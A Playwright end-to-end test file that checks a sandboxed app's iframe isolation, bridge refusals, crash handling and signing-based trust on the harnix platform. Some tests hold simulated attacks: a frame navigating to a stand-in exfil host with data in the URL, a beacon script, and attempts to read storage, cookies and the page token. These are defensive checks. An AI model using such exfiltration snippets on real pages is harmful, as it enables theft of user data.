/**
 * An application's interface in isolated frames (the UI design's §3, §5, §8): the showcase
 * (`examples/apps/showcase`), installed unsigned under `[apps] dev`, draws every surface it
 * declares in a sandboxed frame of its own (`ui/frame/`, on `@harnix/app-sdk` and
 * `@harnix/ui-kit`), and does everything through the shell's bridge.
 *
 * What is shown: its board calls its own methods and gets its own topics; a call it may not make
 * is refused, and listed; it cannot read the page's token or storage, nor reach the network; a
 * crash is caught by the shell's frame, reloads, and repeated crashes set it aside; Escape lands
 * in one place; a theme change reaches it; its space's centre keeps its state while away; its
 * modal, its confirmation, its notice; its other surfaces; the dev reload. And who signed it
 * decides where it runs: a trusted publisher's in the page, the same application in frames when
 * it asks to be.
 */

import { execFileSync } from "node:child_process";
import { appendFileSync, mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import type { Frame, FrameLocator, Page } from "@playwright/test";
import { type Backend, connect, expect, test } from "@harnix/testkit";

import { SHOWCASE_CHATS, SHOWCASE_ID, appsTools, showcasePackage, startApps, variant } from "../api/apps-host";
import { MOCK_PUBLISHER, STORE_FIXTURE } from "../api/apps-store";
import { open, watchConsole } from "./page";

const TAGS = { tag: ["@feature:apps", "@layer:ui"] };
const SPACE = SHOWCASE_ID;

const frameOf = (page: Page, point: string): FrameLocator => page.frameLocator(`iframe.hx-frame[data-app="${SHOWCASE_ID}"][data-point="${point}"]`);
const surfaceOf = (page: Page, point: string) => page.locator(`[data-testid="surface"][data-app="${SHOWCASE_ID}"][data-point="${point}"]`);

/** The frame itself, to look inside it as its own page would. */
async function frameHandle(page: Page, point: string): Promise<Frame> {
  const handle = await page.locator(`iframe.hx-frame[data-app="${SHOWCASE_ID}"][data-point="${point}"]`).elementHandle();
  const frame = await handle!.contentFrame();
  return frame!;
}

async function toSpace(page: Page, space: string): Promise<void> {
  await page.locator(`#side [data-space="${space}"]:not(#sessions)`).click();
  await expect(page.locator("#main")).toHaveAttribute("data-space", space);
}

/** The board, ready, in its space. */
async function board(page: Page): Promise<FrameLocator> {
  await toSpace(page, SPACE);
  await expect(surfaceOf(page, "space")).toHaveAttribute("data-state", "ready", { timeout: 15_000 });
  const frame = frameOf(page, "space");
  await expect(frame.getByTestId("showcase-board")).toBeVisible();
  return frame;
}

test.describe("an application in isolated frames", () => {
  test.describe.configure({ mode: "serial" });
  let backend: Backend;

  test.beforeAll(async () => {
    test.setTimeout(600_000);
    const { path } = showcasePackage();
    backend = await startApps();
    const api = await connect(backend);
    try {
      await api.call("harnix.apps.installFile", { path });
    } finally {
      api.close();
    }
  });
  test.afterAll(async () => {
    await backend?.dispose();
  });

  test("the board, in its sandboxed frame, calls its own methods and gets its own topics", TAGS, async ({ page }) => {
    const errors = watchConsole(page);
    await open(page, backend.url);
    const frame = await board(page);
    // In a frame, not in the page: nothing of it is in the shell's document.
    await expect(page.locator('[data-testid="showcase-board"]')).toHaveCount(0);
    const iframe = page.locator(`iframe.hx-frame[data-app="${SHOWCASE_ID}"][data-point="space"]`);
    await expect(iframe).toHaveAttribute("sandbox", "allow-scripts allow-forms");
    await expect(iframe).toHaveAttribute("src", `/apps/${SHOWCASE_ID}/ui/frame/index.html`);

    await frame.getByTestId("showcase-note-input").fill("from the frame");
    await frame.getByTestId("showcase-note-add").click();
    await expect(frame.getByTestId("showcase-note")).toHaveText(["from the frame"]);
    await expect(frame.getByTestId("showcase-note-input")).toHaveValue("");
    // Another client's note arrives on the topic, without the frame asking.
    const api = await connect(backend);
    try {
      await api.call(`app.${SHOWCASE_ID}.notes.add`, { text: "from another client" });
    } finally {
      api.close();
    }
    await expect(frame.getByTestId("showcase-note")).toHaveText(["from the frame", "from another client"]);
    await frame.getByTestId("showcase-bump").click();
    await expect(frame.getByTestId("showcase-counter")).toHaveText(/\d+/);
    await frame.getByTestId("showcase-heartbeat-start").click();
    await expect(frame.getByTestId("showcase-ticks")).toHaveText("3", { timeout: 10_000 });
    // Its badge, on its space's entry: the board's count of notes.
    await expect(page.locator(`#side [data-space="${SPACE}"] [data-testid="space-badge"]`)).toHaveText("2");
    await expect(frame.getByTestId("showcase-error")).toHaveCount(0);
    expect(errors).toEqual([]);
  });

  test("a call it may not make is refused, and shows in diagnostics and the Apps tab", TAGS, async ({ page }) => {
    await open(page, backend.url);
    const frame = await board(page);
    await frame.getByTestId("showcase-overreach").click();
    await expect(frame.getByTestId("showcase-refused")).toContainText("refused");
    await expect(frame.getByTestId("showcase-refused")).toContainText("harnix.apps.list");
    const noted = await page.evaluate(() => (window as any).harnix.app.registry.refusals().filter((r: any) => r.point === "bridge"));
    expect(noted).toEqual([expect.objectContaining({ owner: SHOWCASE_ID, id: "harnix.apps.list" })]);

    await toSpace(page, "system");
    await page.locator('[data-testid="system-console"] [data-tab="apps"]').click();
    const row = page.locator(`[data-testid="system-app"][data-app="${SHOWCASE_ID}"]`);
    await expect(row.locator('[data-field="surfaces"]')).toHaveText(/^\d+ · 0$/, { timeout: 15_000 });
    await row.click();
    const detail = page.locator(`[data-testid="system-app-detail"][data-app="${SHOWCASE_ID}"]`);
    await expect(detail.getByTestId("system-app-bridge-refusal")).toContainText("harnix.apps.list");
    await expect(detail.locator('[data-testid="system-app-surface"][data-point="space"]')).toHaveAttribute("data-state", "ready");

    // And in Settings → Diagnostics, with the other refusals.
    await page.evaluate(() => (window as any).harnix.host.settings.open("diagnostics"));
    await page.locator('[data-section="diagnostics"]').click();
    await expect(page.locator("#modal")).toContainText("harnix.apps.list");
  });

  test("what its hub lists reaches its own space's sessions, and no other", TAGS, async ({ page }) => {
    // One in its second space (its board's left column counts the first), and one elsewhere.
    const api = await connect(backend);
    let own = "";
    let other = "";
    try {
      own = (await api.call("session.create", { space: SHOWCASE_CHATS, project_root: api.project })).session_id;
      other = (await api.call("session.create", { project_root: api.project })).session_id;
    } finally {
      api.close();
    }
    await open(page, backend.url);
    await board(page);
    const frame = await frameHandle(page, "space");
    const ask = (method: string, params: unknown) =>
      frame.evaluate(
        async ([m, p]) => {
          try {
            return { ok: await (window as any).showcaseBridge.call(m, p) };
          } catch (e: any) {
            return { code: e.code, message: e.message };
          }
        },
        [method, params] as const,
      );
    // The session list is its own spaces': the frame's own when it names none.
    const listed = JSON.stringify(await ask("harnix.sessions", { space: SHOWCASE_CHATS }));
    expect(listed).toContain(own);
    expect(listed).not.toContain(other);
    expect(JSON.stringify(await ask("harnix.sessions", {}))).not.toContain(other);
    expect(await ask("harnix.sessions", { space: "example.elsewhere" })).toMatchObject({ code: "refused" });
    // A session of its own space it may read; one elsewhere it is refused, though the page could.
    expect((await ask("session.get", { instance: "system", session_id: own })).ok).toBeTruthy();
    expect(await ask("session.get", { instance: "system", session_id: other })).toMatchObject({ code: "refused" });
    const noted = await page.evaluate(() => (window as any).harnix.app.registry.refusals().filter((r: any) => r.point === "bridge"));
    expect(noted.map((r: any) => r.id)).toEqual(expect.arrayContaining(["harnix.sessions", "session.get"]));
  });

  test("a page that navigates itself away is emptied at once, and on the record", TAGS, async ({ page }) => {
    const reached: string[] = [];
    await page.route("https://exfil.showcase.test/**", (route) => {
      reached.push(route.request().url());
      return route.fulfill({
        status: 200,
        contentType: "text/html",
        body: "<p>elsewhere</p><script>setInterval(() => { new Image().src = 'https://exfil.showcase.test/beacon?' + Date.now(); }, 50)</script>",
      });
    });
    await page.route("https://exfil.showcase.test/beacon**", (route) => {
      reached.push(route.request().url());
      return route.fulfill({ status: 204 });
    });
    await open(page, backend.url);
    await board(page);
    const surface = surfaceOf(page, "space");
    // The frame's `src`, as the shell sets it from here on.
    await page.evaluate((app) => {
      const iframe = document.querySelector(`iframe.hx-frame[data-app="${app}"][data-point="space"]`)!;
      const srcs: (string | null)[] = ((window as any).srcs = []);
      new MutationObserver(() => srcs.push(iframe.getAttribute("src"))).observe(iframe, { attributes: true, attributeFilter: ["src"] });
    }, SHOWCASE_ID);
    const frame = await frameHandle(page, "space");
    // Its context goes with the navigation, so the evaluation itself may not come back.
    await frame.evaluate(() => void (location.href = `https://exfil.showcase.test/?d=${encodeURIComponent("the board")}`)).catch(() => undefined);
    await expect(surface).toHaveAttribute("data-state", "failed", { timeout: 10_000 });
    await expect(surface.getByTestId("surface-reason")).toContainText(/navigated|跳转/);
    expect(await page.evaluate(() => (window as any).srcs)).toContain("about:blank");
    await expect(page.locator(`iframe.hx-frame[data-app="${SHOWCASE_ID}"][data-point="space"]`)).toHaveCount(0);
    // Where it went was never reached: the page's own `frame-src 'self'` keeps a frame's navigation
    // to this origin, so what it carried in the address goes nowhere else.
    await page.waitForTimeout(500);
    expect(reached, "the frame reached another host").toEqual([]);
    // On the record: the Apps tab's count of its interface's failures, and Diagnostics.
    const failures = await page.evaluate(() => (window as any).harnix.app.registry.refusals().filter((r: any) => r.point === "surface" && r.owner === "example.showcase"));
    expect(failures.length).toBeGreaterThanOrEqual(1);
    await toSpace(page, "system");
    await page.locator('[data-testid="system-console"] [data-tab="apps"]').click();
    const row = page.locator(`[data-testid="system-app"][data-app="${SHOWCASE_ID}"]`);
    await expect(row.locator('[data-field="surfaces"]')).toHaveText(/ · 1$/, { timeout: 15_000 });
  });

  test("it cannot read the page's token, storage or cookies, nor reach the network", TAGS, async ({ page }) => {
    const violations: string[] = [];
    page.on("console", (m) => {
      if (/Content Security Policy/i.test(m.text())) violations.push(m.text());
    });
    await open(page, backend.url);
    await board(page);
    const token = await page.locator('meta[name="harnix-token"]').getAttribute("content");
    expect(token).toBeTruthy();
    const frame = await frameHandle(page, "space");
    const seen = await frame.evaluate(async (base) => {
      const attempt = (fn: () => unknown) => {
        try {
          return String(fn());
        } catch (e) {
          return (e as Error).name;
        }
      };
      const reach = async (url: string) => {
        try {
          await fetch(url);
          return "reached";
        } catch (e) {
          return (e as Error).name;
        }
      };
      const socket = await new Promise<string>((resolve) => {
        try {
          const ws = new WebSocket(base.replace(/^http/, "ws") + "ws");
          ws.onopen = () => resolve("open");
          ws.onerror = () => resolve("error");
          setTimeout(() => resolve("nothing"), 2000);
        } catch (e) {
          resolve((e as Error).name);
        }
      });
      return {
        origin: self.origin,
        storage: attempt(() => localStorage.length),
        session: attempt(() => sessionStorage.length),
        cookie: attempt(() => document.cookie),
        parent: attempt(() => (window.parent as Window).document.title),
        html: document.documentElement.outerHTML,
        sameOrigin: await reach("/"),
        api: await reach(`${base}apps/example.showcase/ui/frame/index.html`),
        outside: await reach("https://example.com/"),
        socket,
      };
    }, backend.url.endsWith("/") ? backend.url : `${backend.url}/`);
    expect(seen.origin).toBe("null");
    expect(seen.storage).toBe("SecurityError");
    expect(seen.session).toBe("SecurityError");
    expect(seen.cookie).toBe("SecurityError");
    expect(seen.parent).toBe("SecurityError");
    expect(seen.html).not.toContain(token!);
    expect(seen.sameOrigin).toBe("TypeError");
    expect(seen.api).toBe("TypeError");
    expect(seen.outside).toBe("TypeError");
    expect(seen.socket).not.toBe("open");
    expect(violations.some((v) => /connect-src/.test(v))).toBe(true);

    // What it is served with, said by the server.
    const response = await fetch(`${backend.url.replace(/\/$/, "")}/apps/${SHOWCASE_ID}/ui/frame/index.html`);
    const csp = response.headers.get("content-security-policy") ?? "";
    expect(response.headers.get("content-type")).toContain("text/html");
    for (const directive of ["default-src 'none'", "script-src 'self'", "connect-src 'none'", "frame-ancestors 'self'", "form-action 'none'"]) {
      expect(csp).toContain(directive);
    }
  });

  test("a crash is caught by its frame and reloads; repeated crashes set it aside", TAGS, async ({ page }) => {
    await open(page, backend.url);
    let frame = await board(page);
    const surface = surfaceOf(page, "space");
    for (let crash = 1; crash <= 3; crash += 1) {
      await frame.getByTestId("showcase-crash").click();
      if (crash < 3) {
        await expect(surface).toHaveAttribute("data-state", "failed", { timeout: 10_000 });
        await expect(surface.getByTestId("surface-failed")).toContainText(/Showcase|示例应用/);
        await expect(surface.getByTestId("surface-reason")).toBeVisible();
        await surface.getByTestId("surface-reload").click();
        await expect(surface).toHaveAttribute("data-state", "ready", { timeout: 15_000 });
        frame = frameOf(page, "space");
        // The reloaded page works: the backend's board is there again.
        await expect(frame.getByTestId("showcase-note")).toHaveCount(2);
      }
    }
    await expect(surface).toHaveAttribute("data-state", "aside", { timeout: 10_000 });
    await expect(surface.getByTestId("surface-aside")).toBeVisible();
    await expect(page.locator(`iframe.hx-frame[data-app="${SHOWCASE_ID}"][data-point="space"]`)).toHaveCount(0);
    // In the diagnostics too (the same failure once: the registry keeps each reason once).
    const failures = await page.evaluate(() => (window as any).harnix.app.registry.refusals().filter((r: any) => r.point === "surface" && r.owner === "example.showcase"));
    expect(failures.length).toBeGreaterThanOrEqual(1);
    // Asked for on purpose, it starts again.
    await surface.getByTestId("surface-retry").click();
    await expect(surface).toHaveAttribute("data-state", "ready", { timeout: 15_000 });
    await expect(frameOf(page, "space").getByTestId("showcase-board")).toBeVisible();
  });

  test("Escape lands in one place: the frame's own, the dialog's, the question's", TAGS, async ({ page }) => {
    await open(page, backend.url);
    const frame = await board(page);
    const escapes = frame.getByTestId("showcase-escapes");
    // In the board, with nothing of the shell's open: the page's own.
    await frame.getByTestId("showcase-scratch").click();
    await page.keyboard.press("Escape");
    await expect(escapes).toHaveText("1");

    // In the modal's frame: it closes the dialog, and the board does not see it.
    await frame.getByTestId("showcase-compose").click();
    const modal = frameOf(page, "modal");
    await modal.getByTestId("showcase-compose-text").click({ timeout: 15_000 });
    await page.keyboard.press("Escape");
    await expect(page.locator("#veil")).not.toHaveClass(/on/);
    await expect(escapes).toHaveText("1");

    // The shell's question over the board: Escape answers it, and goes nowhere else.
    await frame.getByTestId("showcase-clear").click();
    await expect(page.getByTestId("surface-question")).toBeVisible();
    await page.keyboard.press("Escape");
    await expect(page.getByTestId("surface-question")).toHaveCount(0);
    await expect(frame.getByTestId("showcase-confirmed")).toHaveText("no");
    await expect(escapes).toHaveText("1");
    await expect(frame.getByTestId("showcase-note")).toHaveCount(2);

    // A setting section's frame is inside the shell's dialog: Escape there closes Settings.
    await page.evaluate(() => (window as any).harnix.host.settings.open(`example.showcase.board`));
    const settings = frameOf(page, "settings.section");
    await expect(settings.getByTestId("showcase-state")).toBeVisible({ timeout: 15_000 });
    await settings.getByTestId("showcase-state").click();
    await page.keyboard.press("Escape");
    await expect(page.locator("#veil")).not.toHaveClass(/on/);
    await expect(escapes).toHaveText("1");
  });

  test("its modal, the shell's confirmation and its notice", TAGS, async ({ page }) => {
    await open(page, backend.url);
    const frame = await board(page);
    await frame.getByTestId("showcase-compose").click();
    await expect(page.locator("#modal")).toContainText(/A note for the board|给留言板写一条/);
    const modal = frameOf(page, "modal");
    await modal.getByTestId("showcase-compose-text").fill("from the modal");
    await modal.getByTestId("showcase-compose-pin").click();
    await expect(page.locator("#veil")).not.toHaveClass(/on/);
    await expect(frame.getByTestId("showcase-note")).toHaveText(["from the frame", "from another client", "from the modal"]);

    await frame.getByTestId("showcase-notify").click();
    await expect(page.locator("#banner")).toContainText(/Showcase: hello from the board|示例应用：留言板向你问好/);

    // The question is the shell's: drawn over the frame, naming who asks, inert behind it.
    await frame.getByTestId("showcase-clear").click();
    const question = page.getByTestId("surface-question");
    await expect(question).toBeVisible();
    await expect(page.getByTestId("surface-question-app")).toContainText(/Showcase|示例应用/);
    expect(await page.locator(`iframe.hx-frame[data-app="${SHOWCASE_ID}"][data-point="space"]`).evaluate((f) => (f as HTMLIFrameElement).inert)).toBe(true);
    await page.getByTestId("surface-question-yes").click();
    await expect(frame.getByTestId("showcase-confirmed")).toHaveText("yes");
    await expect(frame.getByTestId("showcase-notes-empty")).toBeVisible();
    expect(await page.locator(`iframe.hx-frame[data-app="${SHOWCASE_ID}"][data-point="space"]`).evaluate((f) => (f as HTMLIFrameElement).inert)).toBe(false);
  });

  test("a theme change reaches the frame", TAGS, async ({ page }) => {
    await open(page, backend.url);
    const frame = await board(page);
    await page.evaluate(() => (window as any).harnix.app.setTheme("light"));
    await expect(frame.getByTestId("showcase-theme")).toHaveText("light");
    const light = await frame.getByTestId("showcase-accent").getAttribute("title");
    await page.evaluate(() => (window as any).harnix.app.setTheme("dark"));
    await expect(frame.getByTestId("showcase-theme")).toHaveText("dark");
    await expect(frame.getByTestId("showcase-accent")).not.toHaveAttribute("title", light ?? "");
    const inside = await (await frameHandle(page, "space")).evaluate(() => document.documentElement.dataset.theme);
    expect(inside).toBe("dark");
    await page.evaluate(() => (window as any).harnix.app.setTheme("system"));
  });

  test("its space's centre keeps its state while away, and its other surfaces", TAGS, async ({ page }) => {
    await open(page, backend.url);
    const frame = await board(page);
    await frame.getByTestId("showcase-scratch").fill("kept while away");
    await page.locator(`iframe.hx-frame[data-app="${SHOWCASE_ID}"][data-point="space"]`).evaluate((f) => ((f as any).__mark = "same"));
    await toSpace(page, "sessions");
    // Hidden, not gone.
    await expect(page.locator(`[data-testid="surface-kept"][data-point="space"]`)).toBeHidden();
    await expect(page.locator(`iframe.hx-frame[data-app="${SHOWCASE_ID}"][data-point="space"]`)).toHaveCount(1);
    await toSpace(page, SPACE);
    await expect(frame.getByTestId("showcase-scratch")).toHaveValue("kept while away");
    expect(await page.locator(`iframe.hx-frame[data-app="${SHOWCASE_ID}"][data-point="space"]`).evaluate((f) => (f as any).__mark)).toBe("same");

    // The left column: the space's notes and sessions; a new session lands in the space.
    const side = frameOf(page, "space.sidebar");
    await expect(side.getByTestId("showcase-side")).toBeVisible({ timeout: 15_000 });
    await frame.getByTestId("showcase-note-input").fill("for the panel");
    await frame.getByTestId("showcase-note-add").click();
    await expect(side.getByTestId("showcase-side-notes")).toHaveText("1");
    await side.getByTestId("showcase-new-session").click();
    await expect(side.getByTestId("showcase-made")).toHaveText(/\S/);
    await expect(side.getByTestId("showcase-side-sessions")).toHaveText("1");

    // The right column's tab, opened from the board; the second panel, from a note.
    await frame.getByTestId("showcase-open-tab").click();
    const tab = frameOf(page, "space.tab");
    await expect(tab.getByTestId("showcase-tab")).toBeVisible({ timeout: 15_000 });
    await expect(tab.getByTestId("showcase-tab-visible")).toHaveText("true");
    await frame.getByTestId("showcase-note").first().click();
    const panel = frameOf(page, "space.secondary");
    await expect(panel.getByTestId("showcase-note-text")).toHaveText("for the panel", { timeout: 15_000 });
    await expect(page.getByTestId("secondary-title")).toHaveText("for the panel");
    await panel.getByTestId("showcase-note-close").click();
    await expect(page.getByTestId("secondary")).toHaveCount(0);

    // A details panel for the application's own item kind.
    await page.evaluate(() => (window as any).harnix.app.showDetail({ kind: "example.showcase.note", text: "in the details" }));
    await expect(frameOf(page, "details.panel").getByTestId("showcase-note-text")).toHaveText("in the details", { timeout: 15_000 });
  });

  test("its home card sizes to its content, and its link is the shell's to open", TAGS, async ({ page }) => {
    await open(page, backend.url);
    await toSpace(page, "sessions");
    const card = surfaceOf(page, "home.card");
    await expect(card).toHaveAttribute("data-state", "ready", { timeout: 15_000 });
    await expect(frameOf(page, "home.card").getByTestId("showcase-card")).toContainText(/Seven tools|七个工具/);
    const height = await card.evaluate((el) => el.getBoundingClientRect().height);
    expect(height).toBeGreaterThan(20);
    expect(height).toBeLessThan(200);
    let popups = 0;
    page.on("popup", () => (popups += 1));
    await frameOf(page, "home.card").getByTestId("showcase-readme").click();
    await expect(page.getByTestId("surface-question")).toHaveAttribute("data-kind", "link");
    await expect(page.getByTestId("surface-question-text")).toContainText("github.com");
    await page.getByTestId("surface-question-no").click();
    await expect(page.getByTestId("surface-question")).toHaveCount(0);
    expect(popups).toBe(0);
  });

  test("under [apps] dev, a change to its files reloads its frames", TAGS, async ({ page }) => {
    await open(page, backend.url);
    const frame = await board(page);
    await expect(frame.getByTestId("showcase-board")).toBeVisible();
    const iframe = page.locator(`iframe.hx-frame[data-app="${SHOWCASE_ID}"][data-point="space"]`);
    await iframe.evaluate((f) => ((f as any).__mark = "before"));
    const api = await connect(backend);
    let dir: string;
    try {
      dir = (await api.call("harnix.apps.list")).dir;
    } finally {
      api.close();
    }
    appendFileSync(join(dir, SHOWCASE_ID, "0.1.0", "ui", "frame", "showcase.css"), "\n/* changed */\n");
    await expect.poll(() => iframe.evaluate((f) => (f as any).__mark ?? "new"), { timeout: 15_000 }).toBe("new");
    await expect(surfaceOf(page, "space")).toHaveAttribute("data-state", "ready", { timeout: 15_000 });
  });
});

test.describe("who signed it decides where it runs", () => {
  test.describe.configure({ mode: "serial" });
  let backend: Backend;
  let scratch: string;

  /** The showcase signed by the mock publisher (which the backend trusts), `edit` applied first. */
  function trusted(name: string, edit: (manifest: string) => string): string {
    const plain = variant(join(scratch, `${name}.hxapp`), (entries) => {
      entries.set("harnix-app.toml", Buffer.from(edit(entries.get("harnix-app.toml")!.toString())));
    });
    const signed = join(scratch, `${name}.signed.hxapp`);
    execFileSync(appsTools().pack, ["sign", plain, "--key", join(STORE_FIXTURE, "mock-publisher.key"), "-o", signed], { encoding: "utf8" });
    return signed;
  }

  test.beforeAll(async () => {
    test.setTimeout(600_000);
    showcasePackage();
    scratch = mkdtempSync(join(tmpdir(), "hx-frames-"));
    backend = await startApps({ dev: false, profile: `\n[apps.trusted_publishers]\nexample = ["${MOCK_PUBLISHER}"]\n` });
  });
  test.afterAll(async () => {
    await backend?.dispose();
    if (scratch) rmSync(scratch, { recursive: true, force: true });
  });

  test("a trusted publisher's interface runs in the page, and the same application in frames when it asks", TAGS, async ({ page }) => {
    const api = await connect(backend);
    try {
      expect((await api.call("harnix.apps.installFile", { path: trusted("in-page", (m) => m) })).trust).toBe("trusted");
      await open(page, backend.url);
      await toSpace(page, SPACE);
      // In the page: the module's board, on the shell's React, and no frame at all.
      await expect(page.getByTestId("showcase-board")).toBeVisible({ timeout: 15_000 });
      await expect(page.locator("iframe.hx-frame")).toHaveCount(0);

      await api.call("harnix.apps.uninstall", { id: SHOWCASE_ID });
      const isolated = trusted("isolated", (m) => m.replace("[interface]\n", "[interface]\nisolate = true\n"));
      expect((await api.call("harnix.apps.installFile", { path: isolated })).trust).toBe("trusted");
      await open(page, backend.url);
      await board(page);
      await expect(page.locator('[data-testid="showcase-board"]')).toHaveCount(0);
      await expect(frameOf(page, "space").getByTestId("showcase-board")).toBeVisible();
    } finally {
      api.close();
    }
  });
});
